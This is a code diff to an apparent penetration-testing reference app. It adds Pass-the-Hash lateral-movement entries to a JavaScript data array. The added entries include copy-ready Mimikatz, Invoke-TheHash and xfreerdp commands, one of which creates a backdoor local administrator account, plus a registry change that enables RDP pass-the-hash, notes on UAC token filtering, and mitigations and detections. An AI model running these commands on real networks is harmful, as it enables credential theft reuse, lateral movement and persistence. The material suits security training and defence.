@@ -5881,7 +5881,10 @@ var VULNS = [
               { label: "2. Spray a (possibly shared local-admin) hash across the fleet", cmd: "netexec smb 10.10.10.0/24 -u Administrator -H <nthash> --local-auth\n# (Pwn3d!) marks hosts where the hash grants admin — instant lateral map" },
               { label: "3. Overpass-the-Hash — mint a real Kerberos TGT from the NT hash", cmd: "getTGT.py corp.local/administrator -hashes ':<nthash>' -dc-ip 10.10.10.10\nexport KRB5CCNAME=administrator.ccache\npsexec.py -k -no-pass corp.local/administrator@dc01.corp.local\n# from here you are using Kerberos, which blends in better than raw NTLM" },
               { label: "4. Pass-the-Key — use the AES256 key instead of the NT hash", cmd: "getTGT.py corp.local/administrator -aesKey <aes256_key> -dc-ip 10.10.10.10\nexport KRB5CCNAME=administrator.ccache   # AES avoids RC4 downgrade detections" },
-              { label: "5. Pass-the-Ticket — inject a ticket you stole from memory", cmd: "# Rubeus.exe dump  ->  base64 TGT  ->  Rubeus.exe ptt /ticket:<b64>\nexport KRB5CCNAME=administrator.ccache\nsecretsdump.py -k -no-pass dc01.corp.local" }
+              { label: "5. Pass-the-Ticket — inject a ticket you stole from memory", cmd: "# Rubeus.exe dump  ->  base64 TGT  ->  Rubeus.exe ptt /ticket:<b64>\nexport KRB5CCNAME=administrator.ccache\nsecretsdump.py -k -no-pass dc01.corp.local" },
+              { label: "6. From Windows — Mimikatz sekurlsa::pth", cmd: "# elevated; injects the NT hash into LSASS and spawns a process\n# (/rc4 = /ntlm). The child authenticates over the wire as the user:\nmimikatz.exe privilege::debug \"sekurlsa::pth /user:julio /rc4:<nthash> /domain:<domain> /run:cmd.exe\" exit" },
+              { label: "7. From Windows — Invoke-TheHash (SMB / WMI)", cmd: "# no local admin needed client-side; user+hash must be admin on the TARGET\nImport-Module .\\Invoke-TheHash.psd1\nInvoke-SMBExec -Target 172.16.1.10 -Username julio -Hash <nthash> `\n  -Command \"net user mark Pass123 /add & net localgroup administrators mark /add\"\n# or over WMI (hostname or IP both work):\nInvoke-WMIExec -Target DC01 -Username julio -Hash <nthash> -Command \"<cmd>\"" },
+              { label: "8. RDP Pass-the-Hash (GUI) — xfreerdp /pth", cmd: "# needs Restricted Admin Mode (OFF by default); enable on the target:\nreg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f\n# then pass the hash into an RDP session from Linux:\nxfreerdp /v:10.129.201.126 /u:julio /pth:<nthash>" }
             ]
           },
           {
@@ -5893,6 +5896,16 @@ var VULNS = [
               ["Overpass-the-Hash", "NT hash → request a real Kerberos TGT"],
               ["Pass-the-Key", "AES128/256 key → request a TGT (stealthier than RC4)"],
               ["Pass-the-Ticket", "A stolen TGT/TGS → inject and reuse directly"]
+            ]
+          },
+          {
+            title: "UAC & local accounts (why a local-admin PtH can fail)",
+            type: "notes",
+            items: [
+              "UAC's remote restriction limits LOCAL accounts: by default only the built-in RID-500 Administrator can perform remote administration over the network, so a PtH as any other local admin is refused even with a correct hash.",
+              "LocalAccountTokenFilterPolicy = 1 (a REG_DWORD under the System policies key in HKLM) lifts that limit, letting every local admin be used for remote PtH; 0 (the default) keeps it to RID-500 only.",
+              "Exception: if FilterAdministratorToken = 1 (disabled by default), even the RID-500 account — renamed or not — is filtered, so remote PtH against it fails too.",
+              "These limits apply to local accounts only. A DOMAIN account with admin rights on the host can always be used for PtH, so a local-admin PtH that 'should' work but returns STATUS_LOGON_FAILURE / access denied is usually this policy, not a wrong hash."
             ]
           },
           {
@@ -5914,8 +5927,10 @@ var VULNS = [
               ["Impacket psexec/wmiexec/getTGT", "PtH, overpass-the-hash, pass-the-key execution"],
               ["NetExec", "Spray hashes to map admin access (--local-auth / -H)"],
               ["Rubeus", "dump/ptt (pass-the-ticket), asktgt (overpass-the-hash)"],
-              ["Mimikatz", "sekurlsa::pth, kerberos::ptt"],
-              ["evil-winrm", "-H to pass-the-hash over WinRM"]
+              ["Mimikatz (sekurlsa::pth)", "Windows: spawn a process with an NT hash injected into LSASS"],
+              ["Invoke-TheHash", "Windows PowerShell PtH over SMB/WMI (Invoke-SMBExec / Invoke-WMIExec)"],
+              ["evil-winrm", "-H to pass-the-hash over WinRM (prepend domain\\ for a domain account)"],
+              ["xfreerdp /pth", "Linux: Pass-the-Hash into an RDP GUI session (needs Restricted Admin on the target)"]
             ]
           },
           {
@@ -5923,7 +5938,9 @@ var VULNS = [
             type: "references",
             items: [
               { label: "MITRE ATT&CK T1550.002 — Pass the Hash", url: "https://attack.mitre.org/techniques/T1550/002/" },
-              { label: "Hadess — Pwning the Domain: Lateral Movement", url: "https://hadess.io/" },
+              { label: "Microsoft — NTLM overview", url: "https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview" },
+              { label: "SpecterOps — Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy", url: "https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167" },
+              { label: "Invoke-TheHash — PowerShell PtH (SMB/WMI)", url: "https://github.com/Kevin-Robertson/Invoke-TheHash" },
               { label: "The Hacker Recipes — Pass-the-hash / ticket", url: "https://www.thehacker.recipes/ad/movement/ntlm/pth" }
             ]
           },
@@ -5934,6 +5951,8 @@ var VULNS = [
               "Deploy LAPS so a stolen local-admin hash cannot be reused on other hosts.",
               "Enforce tiered administration so a captured Tier-0 hash/ticket is never present on a Tier-2 workstation.",
               "Enable Credential Guard and LSA Protection to make hashes/tickets harder to steal in the first place.",
+              "Leave LocalAccountTokenFilterPolicy at 0 (and consider FilterAdministratorToken = 1) so non-RID-500 local admins — ideally the RID-500 too — cannot be used for remote pass-the-hash.",
+              "Keep Restricted Admin Mode disabled where it is not needed: enabling it (DisableRestrictedAdmin = 0) is exactly what makes RDP pass-the-hash possible.",
               "Block/limit NTLM where possible and prefer Kerberos; monitor for RC4 overpass-the-hash (encryption downgrade).",
               "Detect: the same account authenticating to many hosts rapidly, and TGT requests from unusual hosts (event 4768/4624 type 3/9)."
             ]
